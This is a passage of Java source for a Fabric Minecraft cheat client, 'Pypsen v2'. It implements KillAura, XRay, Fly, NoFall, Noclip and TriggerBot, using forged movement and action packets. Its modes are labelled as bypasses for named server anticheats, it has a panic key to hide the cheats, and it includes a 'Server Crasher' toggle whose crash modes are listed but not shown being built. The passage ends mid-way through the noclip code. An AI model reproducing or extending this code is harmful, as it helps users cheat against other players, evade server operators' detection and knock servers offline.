package pypsen.client;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.rendering.v1.HudRenderCallback;
import net.minecraft.block.Block;
import net.minecraft.block.Blocks;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.SliderWidget;
import net.minecraft.entity.Entity;
import net.minecraft.entity.LivingEntity;
import net.minecraft.item.AxeItem;
import net.minecraft.item.ItemStack;
import net.minecraft.item.SwordItem;
import net.minecraft.registry.Registries;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.EntityHitResult;
import net.minecraft.util.hit.HitResult;
import net.minecraft.util.math.MathHelper;
import net.minecraft.util.math.Vec3d;
import net.minecraft.world.RaycastContext;
import org.lwjgl.glfw.GLFW;

import java.io.File;
import java.io.FileWriter;
import java.nio.file.Files;
import java.util.*;

public class PypsenClient implements ClientModInitializer {

    // ══════════ TOGGLES ══════════
    public static boolean speedOn = false, auraOn = false, hitboxOn = false, flyOn = false;
    public static boolean xrayOn = false, velocityOn = false, aimOn = false, visualsOn = false;
    public static boolean strafeOn = false, noclipOn = false, antiFlagOn = false, autoClickerOn = false;
    public static boolean hudOn = true, triggerBotOn = false, targetHudOn = true, panicOn = false;
    public static boolean freecamOn = false, playerEspOn = false, auraSpinBot = false;
    public static boolean triggerWeaponOnly = false, autoTotemOn = false, aimLockOn = false;
    public static boolean antiBotOn = true, fullBrightOn = false, nameHiderOn = false;
    public static boolean spiderOn = false, noWebOn = false, freezeOn = false, useModernGui = false;
    public static boolean serverCrasherOn = false, godModeOn = false, autoArmorOn = false, fastBowOn = false;
    public static boolean bowJump = false, auraPredict = true, auraRandomize = true, dropAllItems = false;
    public static boolean jesusOn = false;

    // ══════════ VISUALS SUB-TOGGLES ══════════
    public static boolean seeInvisOn = false, noFireOn = false, noNauseaOn = false;
    public static boolean targetEspOn = false, noHurtCamOn = false;

    // ══════════ KILLAURA ADVANCED ══════════
    public static boolean auraJump = false, auraThroughWalls = true, auraHitInGuis = true;
    public static boolean autoWeapon = false, criticals = false, shieldBreaker = false, waterCrits = false;
    public static boolean auraRayCast = true;
    public static boolean auraTargetPlayers = true, auraTargetMobs = false, auraTargetAnimals = false;

    // ══════════ VALUES ══════════
    public static float speedVal = 5f, auraRange = 6f, hitboxVal = 1f, flySpeed = 2f;
    public static float aimSpeed = 50f, clickerCps = 12f, triggerCps = 10f;
    public static float auraAimJitter = 0.0f, triggerRange = 3.0f;
    public static float auraStickiness = 0.0f, auraRotCurve = 0.0f, auraFov = 360f, auraRotSpeed = 180f;
    public static float autoTotemHealth = 20f;
    public static String fakeName = "Protected";

    // ══════════ MODES ══════════
    public static int auraMode = 0, auraTargetMode = 0, auraRotMode = 0;
    public static int auraTimingMode = 0, auraTargetPart = 1, visualsTargetMode = 0;
    public static int autoTotemMode = 0;
    public static int spiderMode = 0, noWebMode = 0, freezeMode = 0, crasherMode = 0, crasherTimerMode = 0;
    public static boolean airJumpOn = false, noFallOn = false;
    public static int airJumpMode = 0, noFallMode = 0, velocityMode = 0, jesusMode = 0, visualsParticles = 0;
    public static final String[] AIRJUMP_MODES = {"Vanilla", "GhostBlock", "Packet"};
    public static final String[] NOFALL_MODES = {"Packet", "WaterBucket", "Web", "Vulcan", "Grim", "LiquidBounce", "Matrix", "NCP"};
    public static final String[] VELOCITY_MODES = {"Cancel", "Matrix", "Grim", "LiquidBounce", "AAC"};
    public static final String[] JESUS_MODES = {"Solid", "Bounce", "LiquidBounce", "Matrix"};
    public static final String[] PARTICLES_MODES = {"None", "Heart", "Flame", "Magic", "LiquidBounce"};
    public static final String[] AURA_MODES = {"1.9 (Strict Cooldown)", "1.8 (Spam)", "Adaptive"};
    public static final String[] AURA_TARGETS = {"Distance", "Health", "Armor", "Angle"};
    public static final String[] AURA_ROTS = {"None", "Snap", "Smooth", "Silent", "Matrix", "Predict", "Smart", "Legit", "HvH", "Derp", "Cinematic", "NCP", "AAC", "Sunrise", "Vulcan", "Intave", "Legit Smooth", "Looping", "LiquidBounce", "Custom", "Noise"};
    public static final String[] AURA_TIMINGS = {"All", "Fall (Crits)"};
    public static final String[] AURA_PARTS = {"Head", "Chest", "Legs", "Feet"};
    public static final String[] VISUALS_TARGETS = {"All", "Enemies", "Friends"};
    public static final String[] TOTEM_MODES = {"Instant", "Legit"};
    public static final String[] SPIDER_MODES = {"Vanilla", "Jump", "Grim", "GhostBlock"};
    public static final String[] NOWEB_MODES = {"Vanilla", "Fast", "Grim", "Intave", "EdgeTP"};
    public static final String[] FREEZE_MODES = {"Vanilla", "Packet", "Intave", "GhostBlock", "LiquidBounce"};
    public static final String[] CRASHER_MODES = {"Position", "Swing", "Interact", "MathBreaker", "BrandPayload", "SettingsExploit", "TabComplete"};
    public static final String[] CRASHER_TIMERS = {"Infinite", "5s", "10s", "Auto-Disable"};
    public static final String[] GODMODE_MODES = {"Vanilla", "Packet", "Vulcan", "LiquidBounce"};
    public static int godModeMode = 0;

    public static int speedBypass = 0, auraBypass = 0, flyBypass = 0, noclipBypass = 0;
    public static final String[] BYPASS_NAMES = {"None", "Vanilla", "Timer", "Strafe", "NCP", "Matrix", "Grim", "Funtime", "ReallyWorld", "Vulcan", "Spartan", "Grim AC", "Polar AC", "Intave"};
    public static final String[] NOCLIP_MODES = {"Vanilla", "VClip", "HClip", "Packet"};

    // ══════════ KEYBINDS ══════════
    public static int keyMenu = GLFW.GLFW_KEY_MINUS, keySpeed = GLFW.GLFW_KEY_V, keyAura = GLFW.GLFW_KEY_R;
    public static int keyFly = GLFW.GLFW_KEY_G, keyXray = GLFW.GLFW_KEY_X, keyHitbox = GLFW.GLFW_KEY_H;
    public static int keyVelocity = GLFW.GLFW_KEY_UNKNOWN, keyAim = GLFW.GLFW_KEY_UNKNOWN;
    public static int keyVisuals = GLFW.GLFW_KEY_UNKNOWN, keyStrafe = GLFW.GLFW_KEY_UNKNOWN;
    public static int keyNoclip = GLFW.GLFW_KEY_UNKNOWN, keyAntiFlag = GLFW.GLFW_KEY_UNKNOWN;
    public static int keyAutoClicker = GLFW.GLFW_KEY_UNKNOWN, keyTriggerBot = GLFW.GLFW_KEY_UNKNOWN;
    public static int keyPanic = GLFW.GLFW_KEY_UNKNOWN, keyFreecam = GLFW.GLFW_KEY_UNKNOWN;
    public static int keyAutoTotem = GLFW.GLFW_KEY_UNKNOWN, keyAimLock = GLFW.GLFW_KEY_UNKNOWN;
    public static boolean autoClickerRight = false, autoClickerFarm = false;
    public static int keySpider = GLFW.GLFW_KEY_UNKNOWN, keyNoWeb = GLFW.GLFW_KEY_UNKNOWN, keyFreeze = GLFW.GLFW_KEY_UNKNOWN;
    public static int keyCrasher = GLFW.GLFW_KEY_UNKNOWN, keyGodMode = GLFW.GLFW_KEY_UNKNOWN, keyAutoArmor = GLFW.GLFW_KEY_UNKNOWN, keyFastBow = GLFW.GLFW_KEY_UNKNOWN;
    public static int keyAirJump = GLFW.GLFW_KEY_UNKNOWN, keyNoFall = GLFW.GLFW_KEY_UNKNOWN, keyJesus = GLFW.GLFW_KEY_UNKNOWN;

    public static final Set<String> friends = new HashSet<>();
    private static boolean middleClickWasDown = false;
    private static boolean wasFullBright = false;
    private static Vec3d freecamPos = null;
    private static float freecamYaw = 0, freecamPitch = 0;
    private static int totemTimer = 0, totemStep = 0, totemTargetSlot = -1;
    private static long lastTimeUpdate = 0;
    private static long crasherStartTime = 0;
    private static float currentTps = 20.0f;

    public static final Set<Block> XRAY_BLOCKS = new HashSet<>(Arrays.asList(
            Blocks.DIAMOND_ORE, Blocks.DEEPSLATE_DIAMOND_ORE, Blocks.IRON_ORE, Blocks.DEEPSLATE_IRON_ORE,
            Blocks.GOLD_ORE, Blocks.DEEPSLATE_GOLD_ORE, Blocks.EMERALD_ORE, Blocks.DEEPSLATE_EMERALD_ORE,
            Blocks.LAPIS_ORE, Blocks.DEEPSLATE_LAPIS_ORE, Blocks.REDSTONE_ORE, Blocks.DEEPSLATE_REDSTONE_ORE,
            Blocks.COAL_ORE, Blocks.DEEPSLATE_COAL_ORE, Blocks.COPPER_ORE, Blocks.DEEPSLATE_COPPER_ORE,
            Blocks.ANCIENT_DEBRIS, Blocks.NETHER_GOLD_ORE, Blocks.CHEST, Blocks.ENDER_CHEST, Blocks.SPAWNER
    ));

    private static int auraTick = 0, clickTimer = 0, triggerTimer = 0;
    private static boolean xrayWasOn = false, visualsWasOn = false;
    private static LivingEntity currentTarget = null;

    // Smooth rotation targets
    private static float targetYaw = 0f;
    private static float targetPitch = 0f;
    private static boolean isRotating = false;

    @Override
    public void onInitializeClient() {
        loadConfig();

        HudRenderCallback.EVENT.register((ctx, tickDelta) -> {
            MinecraftClient mc = MinecraftClient.getInstance();
            if (mc.player == null || panicOn) return;

            // ── MAIN HUD ──
            if (hudOn) {
                List<String> lines = new ArrayList<>();
                lines.add("\u00a7a\u00a7lPypsen v2 \u00a77[PRO]");
                if (speedOn)       lines.add("\u00a7bSpeed \u00a77" + String.format("%.1f", speedVal) + " [" + BYPASS_NAMES[speedBypass] + "]");
                if (auraOn)        lines.add("\u00a7cKillAura \u00a77" + String.format("%.1f", auraRange) + " [" + BYPASS_NAMES[auraBypass] + "]");
                if (hitboxOn)      lines.add("\u00a7eHitbox \u00a77" + String.format("%.1f", hitboxVal));
                if (flyOn)         lines.add("\u00a7dFly \u00a77" + String.format("%.1f", flySpeed) + " [" + BYPASS_NAMES[flyBypass] + "]");
                if (xrayOn)        lines.add("\u00a76XRay");
                if (velocityOn)    lines.add("\u00a79Velocity");
                if (aimOn)         lines.add("\u00a75AimAssist");
                if (visualsOn)     lines.add("\u00a7aVisuals");
                if (strafeOn)      lines.add("\u00a73Strafe");
                if (noclipOn)      lines.add("\u00a78Noclip");
                if (antiFlagOn)    lines.add("\u00a7eAnti-Flag");
                if (freecamOn)     lines.add("\u00a7bFreeCam");
                if (autoTotemOn)   lines.add("\u00a76AutoTotem");
                if (aimLockOn)     lines.add("\u00a75AimLock");
                if (antiBotOn)     lines.add("\u00a7aAntiBot");
                if (spiderOn)      lines.add("\u00a72Spider");
                if (noWebOn)       lines.add("\u00a7fNoWeb");
                if (freezeOn)      lines.add("\u00a7bFreeze");
                if (airJumpOn)     lines.add("\u00a7bAirJump");
                if (noFallOn)      lines.add("\u00a7aNoFall");
                if (jesusOn)       lines.add("\u00a7bJesus");
                if (serverCrasherOn)lines.add("\u00a7cServer Crasher");
                if (godModeOn)     lines.add("\u00a7eGodMode");
                if (autoArmorOn)   lines.add("\u00a7bAutoArmor");
                if (fastBowOn)     lines.add("\u00a7aFastBow");
                if (fullBrightOn)  lines.add("\u00a7eFullBright");
                if (nameHiderOn)   lines.add("\u00a7dNameHider");
                if (autoClickerOn) lines.add("\u00a7cAutoClicker \u00a77" + String.format("%.1f", clickerCps) + (autoClickerRight ? " [RMB]" : " [LMB]"));
                if (triggerBotOn)  lines.add("\u00a7cTriggerBot \u00a77" + String.format("%.1f", triggerCps));

                // TPS & Ping
                lines.add("");
                lines.add("§7TPS: §f" + String.format("%.1f", currentTps));
                if (mc.getNetworkHandler() != null && mc.getNetworkHandler().getPlayerListEntry(mc.player.getUuid()) != null) {
                    lines.add("§7Ping: §f" + mc.getNetworkHandler().getPlayerListEntry(mc.player.getUuid()).getLatency() + "ms");
                }

                int y = 4;
                for (String s : lines) {
                    ctx.drawTextWithShadow(mc.textRenderer, Text.literal(s), 4, y, 0xFFFFFF);
                    y += 11;
                }
            }

            // ── TARGET HUD ──
            if (targetHudOn && currentTarget != null && currentTarget.isAlive() && mc.player.distanceTo(currentTarget) <= auraRange * 1.5) {
                int sw = mc.getWindow().getScaledWidth();
                int sh = mc.getWindow().getScaledHeight();
                int tx = sw / 2 + 20;
                int ty = sh / 2 + 20;

                ctx.fill(tx, ty, tx + 140, ty + 50, 0x90000000); // Background
                ctx.fill(tx, ty, tx + 140, ty + 2, 0xFF55FF55);  // Top border

                String name = currentTarget.getName().getString();
                float hp = currentTarget.getHealth();
                float maxHp = currentTarget.getMaxHealth();
                int armor = currentTarget.getArmor();
                float dist = mc.player.distanceTo(currentTarget);

                ctx.drawTextWithShadow(mc.textRenderer, Text.literal("\u00a7l" + name), tx + 5, ty + 6, 0xFFFFFF);
                ctx.drawTextWithShadow(mc.textRenderer, Text.literal("\u00a7c\u2764 " + String.format("%.1f", hp)), tx + 5, ty + 18, 0xFFFFFF);
                ctx.drawTextWithShadow(mc.textRenderer, Text.literal("\u00a7b\u25A0 " + armor), tx + 50, ty + 18, 0xFFFFFF);
                ctx.drawTextWithShadow(mc.textRenderer, Text.literal("\u00a77" + String.format("%.1fm", dist)), tx + 95, ty + 18, 0xFFFFFF);

                int hpBarWidth = (int) ((hp / maxHp) * 130);
                ctx.fill(tx + 5, ty + 35, tx + 5 + 130, ty + 42, 0xFF333333);
                ctx.fill(tx + 5, ty + 35, tx + 5 + hpBarWidth, ty + 42, getHealthColor(hp, maxHp));
            }
        });

        ClientTickEvents.END_CLIENT_TICK.register(mc -> {
            if (mc.player == null || mc.world == null) return;
            var p = mc.player;
            long handle = mc.getWindow().getHandle();

            // ── NAMEHIDER (TAB & SCOREBOARD) ──
            if (nameHiderOn && mc.getNetworkHandler() != null) {
                for (net.minecraft.client.network.PlayerListEntry entry : mc.getNetworkHandler().getPlayerList()) {
                    if (entry.getProfile().getId().equals(p.getUuid())) {
                        entry.setDisplayName(Text.literal(fakeName));
                    }
                }
            }

            // ── TPS CALCULATION ──
            long now = System.currentTimeMillis();
            if (now - lastTimeUpdate > 1000) {
                if (mc.getNetworkHandler() != null && mc.getNetworkHandler().getPlayerListEntry(p.getUuid()) != null) {
                    int ping = mc.getNetworkHandler().getPlayerListEntry(p.getUuid()).getLatency();
                    // Simple approximation based on ping for visual effect if real TPS is unavailable
                    currentTps = 20.0f - (ping > 100 ? (ping / 1000.0f) : 0);
                    if (currentTps < 0) currentTps = 0;
                }
                lastTimeUpdate = now;
            }

            // ── PANIC KEY ──
            if (wasPressed(handle, keyPanic)) {
                panicOn = !panicOn;
                if (panicOn) {
                    speedOn = auraOn = hitboxOn = flyOn = xrayOn = velocityOn = aimOn = visualsOn = false;
                    strafeOn = noclipOn = antiFlagOn = autoClickerOn = triggerBotOn = freecamOn = playerEspOn = false;
                    autoTotemOn = aimLockOn = fullBrightOn = nameHiderOn = spiderOn = noWebOn = freezeOn = false;
                    jesusOn = false;
                    mc.worldRenderer.reload();
                }
            }

            if (panicOn) return;

            // ── FRIENDS (MIDDLE CLICK) ──
            boolean middleClickDown = GLFW.glfwGetMouseButton(handle, GLFW.GLFW_MOUSE_BUTTON_MIDDLE) == GLFW.GLFW_PRESS;
            if (middleClickDown && !middleClickWasDown && mc.currentScreen == null) {
                if (mc.crosshairTarget != null && mc.crosshairTarget.getType() == HitResult.Type.ENTITY) {
                    Entity e = ((EntityHitResult) mc.crosshairTarget).getEntity();
                    if (e instanceof net.minecraft.entity.player.PlayerEntity) {
                        String name = e.getName().getString();
                        if (friends.contains(name)) {
                            friends.remove(name);
                            p.sendMessage(Text.literal("\u00a7cRemoved friend: " + name), true);
                        } else {
                            friends.add(name);
                            p.sendMessage(Text.literal("\u00a7aAdded friend: " + name), true);
                        }
                    }
                }
            }
            middleClickWasDown = middleClickDown;

            // ── KEYBINDS ──
            if (mc.currentScreen == null) {
                if (wasPressed(handle, keyMenu)) mc.setScreen(useModernGui ? new ModernGuiScreen() : new MenuScreen());
                if (wasPressed(handle, keySpeed))       speedOn       = !speedOn;
                if (wasPressed(handle, keyAura))        auraOn        = !auraOn;
                if (wasPressed(handle, keyFly))         flyOn         = !flyOn;
                if (wasPressed(handle, keyHitbox))      hitboxOn      = !hitboxOn;
                if (wasPressed(handle, keyVelocity))    velocityOn    = !velocityOn;
                if (wasPressed(handle, keyAim))         aimOn         = !aimOn;
                if (wasPressed(handle, keyStrafe))      strafeOn      = !strafeOn;
                if (wasPressed(handle, keyVisuals))     visualsOn     = !visualsOn;
                if (wasPressed(handle, keyNoclip))      noclipOn      = !noclipOn;
                if (wasPressed(handle, keyAntiFlag))    antiFlagOn    = !antiFlagOn;
                if (wasPressed(handle, keyAutoClicker)) autoClickerOn = !autoClickerOn;
                if (wasPressed(handle, keyTriggerBot))  triggerBotOn  = !triggerBotOn;
                if (wasPressed(handle, keyAutoTotem))   autoTotemOn   = !autoTotemOn;
                if (wasPressed(handle, keyAimLock))     aimLockOn     = !aimLockOn;
                if (wasPressed(handle, keySpider))      spiderOn      = !spiderOn;
                if (wasPressed(handle, keyNoWeb))       noWebOn       = !noWebOn;
                if (wasPressed(handle, keyFreeze))      freezeOn      = !freezeOn;
                if (wasPressed(handle, keyAirJump))     airJumpOn     = !airJumpOn;
                if (wasPressed(handle, keyNoFall))      noFallOn      = !noFallOn;
                if (wasPressed(handle, keyJesus))       jesusOn       = !jesusOn;
                if (wasPressed(handle, keyFreecam)) {
                    freecamOn = !freecamOn;
                    if (freecamOn) {
                        freecamPos = p.getPos();
                        freecamYaw = p.getYaw();
                        freecamPitch = p.getPitch();
                    } else {
                        p.noClip = false;
                        p.getAbilities().flying = false;
                        if (freecamPos != null) {
                            p.setPosition(freecamPos);
                            p.setYaw(freecamYaw);
                            p.setPitch(freecamPitch);
                            p.setVelocity(0, 0, 0);
                        }
                    }
                }
                if (wasPressed(handle, keyXray)) {
                    xrayOn = !xrayOn;
                    mc.worldRenderer.reload();
                }
            }

            mc.getEntityRenderDispatcher().setRenderHitboxes(hitboxOn);

            // ── ANTI-FLAG ──
            if (antiFlagOn) {
                if (speedVal > 2.0f) speedVal = 2.0f;
                if (flySpeed > 1.5f) flySpeed = 1.5f;
                if (auraRange > 4.5f) auraRange = 4.5f;
                if (clickerCps > 15f) clickerCps = 15f;
                if (triggerCps > 15f) triggerCps = 15f;
            }

            // ── AIRJUMP ──
            if (airJumpOn && mc.options.jumpKey.isPressed() && !p.isOnGround() && p.fallDistance > 0.1f) {
                if (p.age % 5 == 0) {
                    if (airJumpMode == 0) { // Vanilla
                        p.jump();
                    } else if (airJumpMode == 1) { // GhostBlock
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket(net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, net.minecraft.util.math.BlockPos.ORIGIN, net.minecraft.util.math.Direction.DOWN));
                        p.jump();
                    } else if (airJumpMode == 2) { // Packet
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround(p.getX(), p.getY(), p.getZ(), true));
                        p.jump();
                    }
                }
            }

            // ── NOFALL ──
            if (noFallOn && p.fallDistance > 2.5f) {
                if (noFallMode == 0) { // Packet
                    mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround(p.getX(), p.getY(), p.getZ(), true));
                    p.fallDistance = 0;
                } else if (noFallMode == 1) { // WaterBucket
                    int slot = -1;
                    for (int i = 0; i < 9; i++) if (p.getInventory().getStack(i).getItem() == net.minecraft.item.Items.WATER_BUCKET) slot = i;
                    if (slot != -1) {
                        int oldSlot = p.getInventory().selectedSlot;
                        p.getInventory().selectedSlot = slot;
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.LookAndOnGround(p.getYaw(), 90, p.isOnGround()));
                        mc.interactionManager.interactItem(p, net.minecraft.util.Hand.MAIN_HAND);
                        p.getInventory().selectedSlot = oldSlot;
                        p.fallDistance = 0;
                    }
                } else if (noFallMode == 2) { // Web
                    int slot = -1;
                    for (int i = 0; i < 9; i++) if (p.getInventory().getStack(i).getItem() == net.minecraft.item.Items.COBWEB) slot = i;
                    if (slot != -1) {
                        int oldSlot = p.getInventory().selectedSlot;
                        p.getInventory().selectedSlot = slot;
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.LookAndOnGround(p.getYaw(), 90, p.isOnGround()));
                        mc.interactionManager.interactItem(p, net.minecraft.util.Hand.MAIN_HAND);
                        p.getInventory().selectedSlot = oldSlot;
                        p.fallDistance = 0;
                    }
                } else if (noFallMode == 3) { // Vulcan
                    mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround(p.getX(), p.getY() - 0.1, p.getZ(), true));
                    p.fallDistance = 0;
                } else if (noFallMode == 4) { // Grim
                    mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround(p.getX(), p.getY() + 1E-9, p.getZ(), false));
                    mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround(p.getX(), p.getY(), p.getZ(), true));
                    p.fallDistance = 0;
                } else if (noFallMode == 5) { // LiquidBounce
                    mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround(p.getX(), p.getY() - 1000, p.getZ(), true));
                    p.fallDistance = 0;
                } else if (noFallMode == 6) { // Matrix
                    if (p.fallDistance > 3f) {
                        p.setVelocity(p.getVelocity().x, -0.05, p.getVelocity().z);
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround(p.getX(), p.getY(), p.getZ(), true));
                        p.fallDistance = 0;
                    }
                } else if (noFallMode == 7) { // NCP
                    mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround(p.getX(), p.getY() - 0.01, p.getZ(), true));
                    p.fallDistance = 0;
                }
            }

            // ── JESUS ──
            if (jesusOn && p.isTouchingWater()) {
                if (jesusMode == 0) { // Solid
                    p.setVelocity(p.getVelocity().x, 0, p.getVelocity().z);
                    p.setOnGround(true);
                } else if (jesusMode == 1) { // Bounce
                    p.setVelocity(p.getVelocity().x, 0.2, p.getVelocity().z);
                } else if (jesusMode == 2) { // LiquidBounce
                    if (p.age % 2 == 0) p.setVelocity(p.getVelocity().x, 0.05, p.getVelocity().z);
                    else p.setVelocity(p.getVelocity().x, -0.05, p.getVelocity().z);
                } else if (jesusMode == 3) { // Matrix
                    if (p.isTouchingWater()) {
                        p.setVelocity(p.getVelocity().x, 0.1, p.getVelocity().z);
                        p.setSprinting(false);
                    }
                }
            }

            // ── FREEZE ──
            if (freezeOn) {
                if (freezeMode == 0) { // Vanilla
                    p.setVelocity(0, 0, 0);
                    p.fallDistance = 0; // Prevent fall damage accumulation
                } else if (freezeMode == 1) { // Packet
                    p.setVelocity(0, 0, 0);
                    mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround(p.getX(), p.getY(), p.getZ(), true));
                } else if (freezeMode == 2) { // Intave
                    // Micro-falling to bypass fly checks
                    p.setVelocity(0, -0.01, 0);
                    p.fallDistance = 0;
                } else if (freezeMode == 3) { // GhostBlock
                    if (p.age % 4 == 0) {
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket(net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, net.minecraft.util.math.BlockPos.ORIGIN, net.minecraft.util.math.Direction.DOWN));
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket(net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket.Action.DROP_ITEM, net.minecraft.util.math.BlockPos.ORIGIN, net.minecraft.util.math.Direction.DOWN));
                        p.setVelocity(p.getVelocity().x, 0.2, p.getVelocity().z);
                    } else {
                        p.setVelocity(p.getVelocity().x, 0, p.getVelocity().z); // Hover between jumps
                    }
                    p.fallDistance = 0;
                } else if (freezeMode == 4) { // LiquidBounce
                    p.setVelocity(0, 0, 0);
                    if (p.age % 2 == 0) {
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround(p.getX(), p.getY() + 1E-5, p.getZ(), p.isOnGround()));
                    }
                }
            }

            // ── SPIDER ──
            if (spiderOn && p.horizontalCollision) {
                if (spiderMode == 0) { // Vanilla
                    Vec3d v = p.getVelocity();
                    p.setVelocity(v.x, 0.2, v.z);
                } else if (spiderMode == 1) { // Jump
                    if (p.isOnGround()) p.jump();
                } else if (spiderMode == 2) { // Grim
                    if (p.age % 4 == 0) {
                        Vec3d v = p.getVelocity();
                        p.setVelocity(v.x, 0.4, v.z);
                    }
                } else if (spiderMode == 3) { // GhostBlock (F+Q Exploit)
                    if (p.age % 4 == 0) {
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket(net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, net.minecraft.util.math.BlockPos.ORIGIN, net.minecraft.util.math.Direction.DOWN));
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket(net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket.Action.DROP_ITEM, net.minecraft.util.math.BlockPos.ORIGIN, net.minecraft.util.math.Direction.DOWN));
                        p.jump();
                    }
                }
            }

            // ── NOWEB (Fast mode logic) ──
            if (noWebOn) {
                Block block = mc.world.getBlockState(p.getBlockPos()).getBlock();
                boolean isWeb = block == net.minecraft.block.Blocks.COBWEB || block == net.minecraft.block.Blocks.SWEET_BERRY_BUSH;

                if (isWeb) {
                    if (noWebMode == 1) { // Fast
                        p.setVelocity(p.getVelocity().x, -0.1, p.getVelocity().z);
                    } else if (noWebMode == 3) { // Intave
                        // Shift sideways slightly to desync web collision on server, and fall fast
                        p.setVelocity(0.05, -0.4, 0.05);
                    } else if (noWebMode == 4) { // EdgeTP
                        boolean foundEdge = false;
                        for (int x = -3; x <= 3 && !foundEdge; x++) {
                            for (int z = -3; z <= 3 && !foundEdge; z++) {
                                if (x == 0 && z == 0) continue;
                                net.minecraft.util.math.BlockPos checkPos = p.getBlockPos().add(x, 0, z);
                                Block checkBlock = mc.world.getBlockState(checkPos).getBlock();
                                if (checkBlock != net.minecraft.block.Blocks.COBWEB && checkBlock != net.minecraft.block.Blocks.SWEET_BERRY_BUSH) {
                                    Vec3d target = new Vec3d(checkPos.getX() + 0.5, checkPos.getY(), checkPos.getZ() + 0.5);
                                    mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround(target.x, target.y, target.z, p.isOnGround()));
                                    p.setPosition(target);
                                    p.setVelocity(0, p.getVelocity().y, 0);
                                    foundEdge = true;
                                }
                            }
                        }
                        if (!foundEdge) {
                            p.setVelocity(0, -0.4, 0); // Fallback if no edge found
                        }
                    }
                }
            }

            // ── AUTOTOTEM ──
            if (autoTotemOn && mc.currentScreen == null) {
                float hp = p.getHealth() + p.getAbsorptionAmount();
                if (hp <= autoTotemHealth && p.getOffHandStack().getItem() != net.minecraft.item.Items.TOTEM_OF_UNDYING) {
                    if (autoTotemMode == 0) { // Instant
                        int slot = -1;
                        for (int i = 9; i < 45; i++) {
                            if (p.playerScreenHandler.getSlot(i).getStack().getItem() == net.minecraft.item.Items.TOTEM_OF_UNDYING) {
                                slot = i;
                                break;
                            }
                        }
                        if (slot != -1) {
                            mc.interactionManager.clickSlot(0, slot, 0, net.minecraft.screen.slot.SlotActionType.PICKUP, p);
                            mc.interactionManager.clickSlot(0, 45, 0, net.minecraft.screen.slot.SlotActionType.PICKUP, p);
                            mc.interactionManager.clickSlot(0, slot, 0, net.minecraft.screen.slot.SlotActionType.PICKUP, p);
                        }
                    } else { // Legit (Step-by-step)
                        if (totemTimer > 0) {
                            totemTimer--;
                        } else {
                            if (totemStep == 0) {
                                totemTargetSlot = -1;
                                for (int i = 9; i < 45; i++) {
                                    if (p.playerScreenHandler.getSlot(i).getStack().getItem() == net.minecraft.item.Items.TOTEM_OF_UNDYING) {
                                        totemTargetSlot = i;
                                        break;
                                    }
                                }
                                if (totemTargetSlot != -1) {
                                    mc.interactionManager.clickSlot(0, totemTargetSlot, 0, net.minecraft.screen.slot.SlotActionType.PICKUP, p);
                                    totemStep = 1;
                                    totemTimer = 2; // 2 ticks delay
                                }
                            } else if (totemStep == 1) {
                                mc.interactionManager.clickSlot(0, 45, 0, net.minecraft.screen.slot.SlotActionType.PICKUP, p);
                                totemStep = 2;
                                totemTimer = 2;
                            } else if (totemStep == 2) {
                                mc.interactionManager.clickSlot(0, totemTargetSlot, 0, net.minecraft.screen.slot.SlotActionType.PICKUP, p);
                                totemStep = 0;
                                totemTimer = 10; // Cooldown
                            }
                        }
                    }
                } else {
                    totemStep = 0; // Reset if we have a totem or health is high
                }
            }

            // ── NOCLIP ──
            if (noclipOn) {
                if (noclipBypass == 0) { // Vanilla
                    p.noClip = true;
                    p.fallDistance = 0;
                } else if (noclipBypass == 1) { // VClip (Vertical teleport)
                    if (mc.options.jumpKey.isPressed()) p.setPosition(p.getX(), p.getY() + 0.5, p.getZ());
                    if (mc.options.sneakKey.isPressed()) p.setPosition(p.getX(), p.getY() - 0.5, p.getZ());
                } else if (noclipBypass == 2) { // HClip (Horizontal teleport)
                    Vec3d forward = p.getRotationVec(1.0f).multiply(0.5);
                    p.setPosition(p.getX() + forward.x, p.getY(), p.getZ() + forward.z);
                } else if (noclipBypass == 3) { // Packet (Desync)
